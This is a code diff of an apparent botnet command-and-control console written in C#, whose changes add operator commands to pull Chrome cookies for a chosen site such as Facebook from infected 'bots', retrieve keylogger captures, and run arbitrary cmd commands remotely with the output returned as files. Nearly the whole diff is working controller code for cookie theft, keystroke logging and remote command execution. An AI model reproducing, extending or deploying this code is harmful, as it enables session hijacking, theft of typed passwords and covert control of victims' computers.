@@ -16,7 +16,7 @@ namespace Control
         //static IPAddress address = IPAddress.Parse("192.168.1.102");
         //static TcpListener listener = new TcpListener(address, 6969);
         private const int BUFFER_SIZE = 1024;
-        private const int PORT_NUMBER = 9999;
+        private const int PORT_NUMBER = 9669;
         static ASCIIEncoding encoding = new ASCIIEncoding();
         static void Main(string[] args)
         {
@@ -57,12 +57,24 @@ namespace Control
             }
         }
 
-        public static void receiveFileSocket(TcpClient client)
+        public static void receiveFileSocket(TcpClient client,string type)
         {
-            
-               
 
-                NetworkStream stream = client.GetStream();
+            string fileName ="";
+            if (type =="cookies")
+            {
+                fileName = "cookies.txt";
+            }  
+            else if( type =="keylogger")
+            {
+                fileName = "keylogger.txt";
+            }
+            else if (type == "cmd")
+            {
+                fileName = "cmdResult.txt";
+            }
+
+            NetworkStream stream = client.GetStream();
 
                 byte[] fileSizeBytes = new byte[4];
                 int bytes = stream.Read(fileSizeBytes, 0, 4);
@@ -86,7 +98,7 @@ namespace Control
                 bytesLeft -= curDataSize;
 
             }
-                FileStream fs = new FileStream("cookies.txt", FileMode.OpenOrCreate);
+                FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate);
                 fs.Write(data, 0, dataLength);
                 fs.Close();
          }    
@@ -101,90 +113,109 @@ namespace Control
             } 
             else if(command == "exit")
             {
-                socket.Send(encoding.GetBytes("exit"));
+                //socket.Send(encoding.GetBytes("exit"));
+
+                sendMessageSocket("exit", socket);
                 Console.WriteLine("Sending exit command...");
 
-                byte[] data = new byte[BUFFER_SIZE];
-                socket.Receive(data);
-                Console.WriteLine("Client: " + encoding.GetString(data));
-            }    
+                // receive message
+                //byte[] data = new byte[BUFFER_SIZE];
+                //socket.Receive(data);
+                //Console.WriteLine("Client: " + encoding.GetString(data));
+
+
+                string messageReceive = receiveMessageSocket(socket);
+                Console.WriteLine("Client: " + messageReceive);
+
+            }
             else if(command== "get cookies")
             {
-                socket.Send(encoding.GetBytes("cookies"));
+                
+                Console.WriteLine("Enter url you want to get cookie, please write full url (example : https://www.facebook.com):");
+                string url = Console.ReadLine();
+                string ms = "cookies?" + url + "?";
+
+
+                //Console.WriteLine(ms);
+                //socket.Send(encoding.GetBytes(ms));
+
+                sendMessageSocket(ms, socket);
                 Console.WriteLine("Sending request get cookies...");
 
-               // byte[] data = new byte[BUFFER_SIZE];
+
+                receiveFileSocket(client,"cookies");
+                Console.WriteLine("Receive cookies complete!");
+
+
+
+                //byte[] data = new byte[BUFFER_SIZE];
                 //socket.Receive(data);
-
-                receiveFileSocket(client);
-               // Console.WriteLine("Client: " + encoding.GetString(data));
-
+                //Console.WriteLine("Client: " + encoding.GetString(data));
                 //byte[] buffer = new byte[1024];
                 //int bytesRead = stream.Read(buffer, 0, buffer.Length);
                 //string message = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                 //Console.WriteLine("Client: " + message);
- 
+
             }
-            else if (command == "get file keylogger")
+            else if (command == "get keylogger")
             {
-                
 
-                socket.Send(encoding.GetBytes("keylogger"));
+                //<------send message example------->
+                //socket.Send(encoding.GetBytes("keylogger"));
+                //Console.WriteLine("Sending request get keylogger...");
+                //byte[] data = new byte[BUFFER_SIZE];
+                //socket.Receive(data);
+                //Console.WriteLine("Client: " + encoding.GetString(data));
+
+                //<------send message & receive file ------->
+
+
+                //socket.Send(encoding.GetBytes("keylogger"));
+                sendMessageSocket("keylogger", socket);
                 Console.WriteLine("Sending request get keylogger...");
-                byte[] data = new byte[BUFFER_SIZE];
-                socket.Receive(data);
+                receiveFileSocket(client, "keylogger");
+                Console.WriteLine("Receive keylogger complete!");
 
 
-                Console.WriteLine("Client: " + encoding.GetString(data));
+            }
+            else if (command == "run cmd command")
+            {
+                string cmd = "";
+                Console.Write("Enter command:");
+                cmd = Console.ReadLine();
+                string ms = "run cmd command " + cmd;
+
+
+                sendMessageSocket(ms,socket);
+                Console.WriteLine("Sending request run cmd command...");
+
+
+                receiveFileSocket(client, "cmd");
+                Console.WriteLine("Receive rs command complete!");
+
+
             }
             else if(command == "help")
             {
-                Console.WriteLine("clear                               --> Clear The Screen");
                 Console.WriteLine("get cookies                         --> Get Cookies Chrome From Bot");
-                Console.WriteLine("get file keylogger                  --> Get File From Bot");
+                Console.WriteLine("get keylogger                       --> Get File From Bot");
+                Console.WriteLine("run cmd command                     --> Get Result Command From Bot");
+                Console.WriteLine("clear                               --> Clear The Screen");
+                Console.WriteLine("exit                                --> Exit Socket");
             }
                
         }
-        public static void sendMessageSocket(string message)
+        public static void sendMessageSocket(string message,Socket socket)
         {
-
+            socket.Send(encoding.GetBytes(message));
         }
-        public static void receiveFileSocket( Socket socket)
+        public static string receiveMessageSocket(Socket socket)
         {
-            //Console.Write("Waiting for a connection... ");
-
-            //// Perform a blocking call to accept requests.
-            //// You could also use server.AcceptSocket() here.
-            //TcpClient client = server.AcceptTcpClient();
-            //Console.WriteLine("Connected!");
-
-            //NetworkStream stream = socket.GetStream();
-
-            //byte[] fileSizeBytes = new byte[4];
-            //int bytes = stream.Read(fileSizeBytes, 0, 4);
-            //int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);
-
-            //int bytesLeft = dataLength;
-            //byte[] data = new byte[dataLength];
-
-            //int bufferSize = 1024;
-            //int bytesRead = 0;
-
-            //while (bytesLeft > 0)
-            //{
-            //    int curDataSize = Math.Min(bufferSize, bytesLeft);
-            //    if (client.Available < curDataSize)
-            //        curDataSize = client.Available; //This saved me
-
-            //    bytes = stream.Read(data, bytesRead, curDataSize);
-
-            //    bytesRead += curDataSize;
-            //    bytesLeft -= curDataSize;
-            //}
-
-            //FileStream fs = new FileStream(@"D:\test.jpg", FileMode.OpenOrCreate);
-            //fs.Write(data, 0, dataLength);
-            //fs.Close();
+            byte[] data = new byte[BUFFER_SIZE];
+            socket.Receive(data);
+            string rs = encoding.GetString(data);
+            return rs;
         }
+
     }
 }
